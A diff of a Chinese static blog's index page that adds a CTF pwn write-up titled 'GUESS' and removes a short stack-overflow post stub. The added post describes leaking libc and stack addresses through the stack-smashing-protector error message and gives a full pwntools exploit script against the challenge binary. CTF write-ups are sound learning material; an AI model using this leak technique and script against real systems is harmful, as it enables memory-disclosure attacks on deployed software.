@@ -206,6 +206,85 @@
             
 
   
+    <article id="post-GUESS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/03/23/GUESS/" target="_blank">GUESS</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/03/23/GUESS/" class="archive-article-date">
+        <time datetime="2024-03-23T10:34:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-23</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>开了canary</p>
+<p><img src="https://i0.imgs.ovh/2024/03/22/gkJhl.png" alt="image-20240323183540854"></p>
+<h5 id="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数"><a href="#在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数" class="headerlink" title="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数"></a>在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数</h5><p><img src="https://i0.imgs.ovh/2024/03/22/gsrOt.png" alt="image-20240323211819577"></p>
+<h5 id="把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"><a href="#把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移" class="headerlink" title="把argc的位置覆盖成puts_got,泄露偏移，算出environ&#x3D;base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"></a>把argc的位置覆盖成puts_got,泄露偏移，算出environ&#x3D;base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移</h5><h5 id="本地一直打不通，调试也有问题"><a href="#本地一直打不通，调试也有问题" class="headerlink" title="本地一直打不通，调试也有问题"></a>本地一直打不通，调试也有问题</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node5.buuoj.cn&quot;,26222)</span></span><br><span class="line">p=process(<span class="string">&quot;./GUESS&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27; guessing flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;detected ***: &#x27;</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">environ=base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(environ)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27; guessing flag&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;detected ***: &#x27;</span>)</span><br><span class="line">envi=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(envi))</span><br><span class="line">flag=envi-<span class="number">0x168</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(flag)</span><br><span class="line">p.recvuntil(<span class="string">&#x27; guessing flag&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/03/23/GUESS/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-bad" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -959,82 +1038,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2024/03/12/SWPUCTF-2019-login/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-stkof" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2024/03/11/stkof/" target="_blank">STKOF</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2024/03/11/stkof/" class="archive-article-date">
-        <time datetime="2024-03-11T12:53:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-11</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h5 id="两道程序题，一道32位一道64位，都是栈溢出的题"><a href="#两道程序题，一道32位一道64位，都是栈溢出的题" class="headerlink" title="两道程序题，一道32位一道64位，都是栈溢出的题"></a>两道程序题，一道32位一道64位，都是栈溢出的题</h5><p><img src="https://i0.imgs.ovh/2024/03/10/R2zsu.png" alt="image-20240311205640177"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/10/R2t8p.png" alt="image-20240311205417765"></p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2024/03/11/stkof/">展开全文 >></a>
     </p>
     
 
